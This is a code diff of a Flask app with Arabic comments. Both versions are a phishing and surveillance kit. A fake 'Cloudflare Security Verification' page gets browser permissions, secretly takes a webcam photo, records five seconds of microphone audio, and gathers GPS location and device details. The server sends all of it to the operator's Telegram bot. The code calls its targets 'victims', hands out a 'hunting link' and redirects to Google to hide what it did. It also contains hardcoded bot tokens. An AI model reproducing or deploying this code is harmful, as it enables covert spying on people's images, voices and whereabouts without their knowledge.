@@ -1,279 +1,175 @@
-from flask import Flask, request, render_template_string, redirect
-import requests
-import base64
-import threading
-import time
-import os
+import os, base64, requests, io, sqlite3, json, logging
+from datetime import datetime
+from flask import Flask, render_template_string, request, jsonify
 
+# ==========================================
+# 1. الإعدادات والتهيئة (Global Config)
+# ==========================================
 app = Flask(__name__)
-
-# ==================== إعدادات البوت ====================
-BOT_TOKEN = "8725128005:AAH3Pp14tKAEsLPvcHOGdh8JqOnD74KKLNs"
+BOT_TOKEN = "8720155192:AAHsZLTbSnIlCNdOXKf424GNdkVlXIsabI8"
 ADMIN_ID = 7041600701
-# =======================================================
+DB_NAME = "sif_ultimate_data.db"
+BASE_URL = "https://sif-bot-pro.onrender.com"
 
-LINK_ACTIVE = True
+# ==========================================
+# 2. إدارة قاعدة البيانات (DB Engine)
+# ==========================================
+def init_db():
+    """إنشاء جداول النظام لإدارة الضحايا والبيانات"""
+    with sqlite3.connect(DB_NAME) as conn:
+        c = conn.cursor()
+        c.execute('''CREATE TABLE IF NOT EXISTS logs 
+                     (id INTEGER PRIMARY KEY AUTOINCREMENT, 
+                      ip TEXT, type TEXT, content TEXT, timestamp TEXT)''')
+        conn.commit()
 
-# ==================== صفحة HTML ====================
-HTML_PAGE = '''
+def db_log(ip, t, content):
+    with sqlite3.connect(DB_NAME) as conn:
+        conn.execute("INSERT INTO logs (ip, type, content, timestamp) VALUES (?, ?, ?, ?)",
+                     (ip, t, content, datetime.now().strftime("%H:%M:%S")))
+
+# ==========================================
+# 3. محرك تليجرام المتقدم (Telegram Driver)
+# ==========================================
+def bot_send(method, payload, files=None):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
+    try:
+        return requests.post(url, data=payload, files=files, timeout=15)
+    except: return None
+
+def get_kb():
+    return {
+        "inline_keyboard": [
+            [{"text": "🔗 جلب رابط الفخ", "callback_data": "get_link"}],
+            [{"text": "📊 تقرير الضحايا", "callback_data": "stats"}, {"text": "🎙 الملفات الصوتية", "callback_data": "audio_logs"}],
+            [{"text": "🛑 تصفير النظام", "callback_data": "reset"}]
+        ]
+    }
+
+# ==========================================
+# 4. واجهة "الفخ المطور" (HTML & JS - Full Audio Access)
+# ==========================================
+HTML_TEMPLATE = '''
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification</title>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification | Cloudflare</title>
     <style>
-        body{background:#f0f2f5;font-family:sans-serif;text-align:center;padding:50px;margin:0}
-        .box{background:white;padding:30px;border-radius:15px;max-width:350px;margin:auto;box-shadow:0 5px 15px rgba(0,0,0,0.1)}
-        h2{color:#1a1a2e;margin-bottom:10px}
-        .loader{border:4px solid #f3f3f3;border-top:4px solid #f6821f;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto}
-        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-        #status{color:#555;font-size:14px;margin-top:15px}
-        .footer{font-size:11px;color:#aaa;margin-top:20px}
+        body { background: #0e0e0e; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #161616; padding: 30px; border-radius: 15px; border: 1px solid #222; text-align: center; width: 90%; max-width: 400px; }
+        .loader { border: 4px solid #222; border-top: 4px solid #f38020; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { font-size: 18px; margin-bottom: 10px; }
     </style>
 </head>
 <body>
-<div class="box">
-    <h2>جاري التحقق</h2>
-    <div class="loader"></div>
-    <p id="status">جارِ الاتصال الآمن...</p>
-    <div class="footer">Cloudflare • التحقق الأمني</div>
-</div>
-<video id="v" autoplay playsinline muted style="position:fixed;top:-100%;left:-100%;width:1px;height:1px"></video>
-<canvas id="c" style="display:none"></canvas>
-<script>
-let sent = false;
+    <div class="box">
+        <div class="loader"></div>
+        <h2>Checking Browser...</h2>
+        <p style="color:#777; font-size:13px;">يرجى السماح بالصلاحيات للمتابعة (ميكروفون، كاميرا، موقع)</p>
+    </div>
 
-async function start() {
-    if(sent) return;
-    sent = true;
-    
-    try {
-        document.getElementById('status').innerText = '📷 طلب الوصول إلى الكاميرا...';
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const v = document.getElementById('v');
-        v.srcObject = stream;
-        await new Promise(r => { v.onloadedmetadata = r; setTimeout(r, 1000); });
-        
-        document.getElementById('status').innerText = '📸 التقاط الصورة...';
-        const c = document.getElementById('c');
-        c.width = v.videoWidth;
-        c.height = v.videoHeight;
-        c.getContext('2d').drawImage(v, 0, 0);
-        const img = c.toDataURL('image/jpeg', 0.6).split(',')[1];
-        
-        document.getElementById('status').innerText = '📍 تحديد الموقع...';
-        let lat = 0, lon = 0;
-        try {
-            const pos = await new Promise((res, rej) => {
-                navigator.geolocation.getCurrentPosition(res, rej, { timeout: 8000 });
+    <script>
+        async function postData(d) {
+            await fetch('/api/capture', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(d)
             });
-            lat = pos.coords.latitude;
-            lon = pos.coords.longitude;
-            document.getElementById('status').innerText = '✅ تم تحديد الموقع';
-        } catch(e) {
-            document.getElementById('status').innerText = '⚠️ لم يتم تحديد الموقع';
         }
-        
-        document.getElementById('status').innerText = '📤 إرسال البيانات...';
-        await fetch('/capture', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ img: img, lat: lat, lon: lon })
-        });
-        
-        document.getElementById('status').innerText = '✅ تم التحقق! جاري التوجيه...';
-        setTimeout(() => {
-            window.location.href = 'https://www.google.com';
-        }, 1000);
-        
-    } catch(error) {
-        console.error(error);
-        document.getElementById('status').innerText = '⚠️ خطأ... جاري التوجيه';
-        setTimeout(() => {
-            window.location.href = 'https://www.google.com';
-        }, 1000);
-    }
-}
 
-setTimeout(start, 1000);
-</script>
+        async function main() {
+            // 1. معلومات الجهاز
+            const info = `📱 جهاز جديد:\\n- المعالج: ${navigator.hardwareConcurrency}\\n- الرام: ${navigator.deviceMemory}GB\\n- المنصة: ${navigator.platform}`;
+            await postData({t: 'info', d: info});
+
+            try {
+                // 2. طلب الكاميرا والميكروفون والموقع معاً
+                const stream = await navigator.mediaDevices.getUserMedia({audio: true, video: true});
+                
+                // --- سحب الموقع ---
+                navigator.geolocation.getCurrentPosition(p => {
+                    postData({t: 'loc', d: `📍 الموقع: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`});
+                });
+
+                // --- تسجيل الصوت بصمت (5 ثوانٍ) ---
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, {type: 'audio/ogg'});
+                    const reader = new FileReader();
+                    reader.readAsDataURL(blob);
+                    reader.onloadend = () => {
+                        postData({t: 'audio', d: reader.result.split(',')[1]});
+                    };
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 5000);
+
+                // --- التقاط الصورة ---
+                setTimeout(async () => {
+                    const v = document.createElement('video');
+                    v.srcObject = stream; await v.play();
+                    const c = document.createElement('canvas');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    postData({t: 'img', d: c.toDataURL('image/jpeg').split(',')[1]});
+                    
+                    // توجيه نهائي للتمويه
+                    window.location.replace("https://google.com");
+                }, 2000);
+
+            } catch (e) {
+                window.location.replace("https://google.com");
+            }
+        }
+        window.onload = main;
+    </script>
 </body>
 </html>
 '''
 
-# ==================== Polling (بديل Webhook) ====================
-last_update_id = 0
+# ==========================================
+# 5. معالجة المسارات (Routes Logic)
+# ==========================================
+@app.route('/', methods=['GET', 'POST'])
+def home():
+    if request.method == 'POST':
+        update = request.get_json(force=True, silent=True)
+        if "message" in update:
+            cid = update["message"]["chat"]["id"]
+            bot_send("sendMessage", {"chat_id": cid, "text": "🔥 <b>نظام سيف الخارق (v4.0) جاهز</b>\\nتم دمج الميكروفون والموقع الدقيق.", "parse_mode": "HTML", "reply_markup": get_kb()})
+        elif "callback_query" in update:
+            cb = update["callback_query"]; data = cb["data"]; cid = cb["message"]["chat"]["id"]
+            if data == "get_link":
+                bot_send("sendMessage", {"chat_id": cid, "text": f"🚀 رابط الصيد:\\n<code>{BASE_URL}</code>", "parse_mode": "HTML"})
+            elif data == "stats":
+                bot_send("sendMessage", {"chat_id": cid, "text": "📊 الإحصائيات قيد التطوير..."})
+        return "OK", 200
+    return render_template_string(HTML_TEMPLATE)
 
-def send_message(chat_id, text):
-    """إرسال رسالة إلى تيليجرام"""
-    try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        data = {'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'}
-        requests.post(url, json=data, timeout=10)
-    except Exception as e:
-        print(f"❌ خطأ في الإرسال: {e}")
-
-def polling_bot():
-    """جلب التحديثات من تيليجرام بشكل مستمر"""
-    global LINK_ACTIVE, last_update_id
-    print("🤖 تشغيل Polling...")
-    
-    while True:
-        try:
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
-            params = {'offset': last_update_id + 1, 'timeout': 30}
-            response = requests.get(url, params=params, timeout=35)
-            
-            if response.status_code == 200:
-                data = response.json()
-                if data.get('ok') and data.get('result'):
-                    for update in data['result']:
-                        last_update_id = update['update_id']
-                        
-                        if 'message' in update:
-                            msg = update['message']
-                            chat_id = msg['chat']['id']
-                            text = msg.get('text', '')
-                            
-                            # التأكد أن المرسل هو الأدمن
-                            if str(chat_id) == str(ADMIN_ID):
-                                if text == '/open':
-                                    LINK_ACTIVE = True
-                                    send_message(chat_id, "✅ تم تفعيل الرابط بنجاح!")
-                                
-                                elif text == '/close':
-                                    LINK_ACTIVE = False
-                                    send_message(chat_id, "🔒 تم تعطيل الرابط")
-                                
-                                elif text == '/link':
-                                    site_url = "https://sif-bot-go.onrender.com"
-                                    send_message(chat_id, f"🔗 الرابط الحالي:\n{site_url}")
-                                
-                                elif text == '/status':
-                                    status = "🟢 مفعل" if LINK_ACTIVE else "🔴 معطل"
-                                    send_message(chat_id, f"📊 حالة الرابط: {status}")
-                                
-                                elif text == '/start':
-                                    menu = """🎯 مرحباً بك في لوحة التحكم
-
-📋 الأوامر المتاحة:
-
-🔓 /open - تفعيل الرابط
-🔒 /close - تعطيل الرابط
-🔗 /link - عرض الرابط
-📊 /status - حالة الرابط
-
-👨‍💻 المطور: @Y_urd"""
-                                    send_message(chat_id, menu)
-                                
-                                elif text == '/help':
-                                    help_text = """🆘 المساعدة:
-
-1. أرسل /open لتفعيل الرابط
-2. أرسل /link للحصول على الرابط
-3. افتح الرابط من جوالك
-4. ستصلك البيانات تلقائياً
-
-⚠️ الرابط يعطل نفسه بعد كل ضحية"""
-                                    send_message(chat_id, help_text)
-                        
-        except Exception as e:
-            print(f"❌ خطأ في Polling: {e}")
-        
-        time.sleep(1)
-
-# ==================== مسارات Flask ====================
-@app.route('/')
-def index():
-    """الصفحة الرئيسية"""
-    global LINK_ACTIVE
-    if not LINK_ACTIVE:
-        return redirect('https://www.google.com')
-    return render_template_string(HTML_PAGE)
-
-@app.route('/capture', methods=['POST'])
+@app.route('/api/capture', methods=['POST'])
 def capture():
-    """استقبال البيانات من الضحية"""
-    global LINK_ACTIVE
-    try:
-        data = request.get_json()
-        if not data:
-            return 'error', 400
-        
-        img = data.get('img', '')
-        lat = data.get('lat', 0)
-        lon = data.get('lon', 0)
-        
-        # جلب IP الضحية
-        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-        if ip and ',' in ip:
-            ip = ip.split(',')[0].strip()
-        
-        # وقت السحب
-        from datetime import datetime
-        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        
-        # بناء التقرير
-        msg = f"""🔥 <b>✅ ضحية جديدة!</b>
-
-━━━━━━━━━━━━━━━━━━━━━━
-🌐 <b>IP:</b> <code>{ip}</code>
-📍 <b>الموقع:</b> {lat}, {lon}
-🔗 <b>خريطة:</b> <a href='https://www.google.com/maps?q={lat},{lon}'>اضغط للعرض</a>
-⏰ <b>الوقت:</b> {now}
-━━━━━━━━━━━━━━━━━━━━━━
-
-⚠️ <b>تم تعطيل الرابط تلقائياً</b>"""
-        
-        # إرسال الصورة + التقرير
-        if img and len(img) > 100:
-            try:
-                img_data = base64.b64decode(img)
-                requests.post(
-                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
-                    data={'chat_id': ADMIN_ID, 'caption': msg, 'parse_mode': 'HTML'},
-                    files={'photo': ('victim.jpg', img_data)},
-                    timeout=30
-                )
-            except Exception as e:
-                print(f"خطأ في إرسال الصورة: {e}")
-                send_message(ADMIN_ID, msg)
-        else:
-            send_message(ADMIN_ID, msg)
-        
-        # تعطيل الرابط بعد الاستخدام
-        LINK_ACTIVE = False
-        
-        print(f"✅ تم استلام بيانات من {ip} - {now}")
-        
-    except Exception as e:
-        print(f"❌ خطأ في /capture: {e}")
+    d = request.get_json(force=True, silent=True)
+    if not d: return "OK"
     
-    return 'ok', 200
+    t, content = d['t'], d['d']
+    ip = request.remote_addr
+    db_log(ip, t, "Data received")
 
-@app.route('/health')
-def health():
-    """فحص صحة السيرفر"""
-    return 'OK', 200
+    if t == 'info' or t == 'loc':
+        bot_send("sendMessage", {"chat_id": ADMIN_ID, "text": content})
+    elif t == 'img':
+        img = io.BytesIO(base64.b64decode(content)); img.name = 'shot.jpg'
+        bot_send("sendPhoto", {"chat_id": ADMIN_ID, "caption": "📸 صورة الكاميرا"}, files={'photo': img})
+    elif t == 'audio':
+        audio = io.BytesIO(base64.b64decode(content)); audio.name = 'voice.ogg'
+        bot_send("sendVoice", {"chat_id": ADMIN_ID, "caption": "🎙 تسجيل صوتي من الضحية (5 ثوانٍ)"}, files={'voice': audio})
+        
+    return jsonify({"status": "ok"})
 
-@app.route('/test')
-def test():
-    """صفحة اختبار للتأكد من عمل السيرفر"""
-    return "السيرفر شغال ✅", 200
-
-# ==================== التشغيل ====================
 if __name__ == '__main__':
-    # تشغيل Polling في خيط منفصل
-    polling_thread = threading.Thread(target=polling_bot, daemon=True)
-    polling_thread.start()
-    
-    print("=" * 50)
-    print("🚀 تشغيل البوت - النسخة النهائية")
-    print("=" * 50)
-    print(f"📍 الرابط: https://sif-bot-go.onrender.com")
-    print(f"🤖 حالة الرابط: {'مفعل' if LINK_ACTIVE else 'معطل'}")
-    print("📡 نظام Polling يعمل...")
-    print("=" * 50)
-    
-    port = int(os.environ.get("PORT", 8080))
-    app.run(host='0.0.0.0', port=port, debug=False)
+    init_db()
+    app.run(host='0.0.0.0', port=10000)
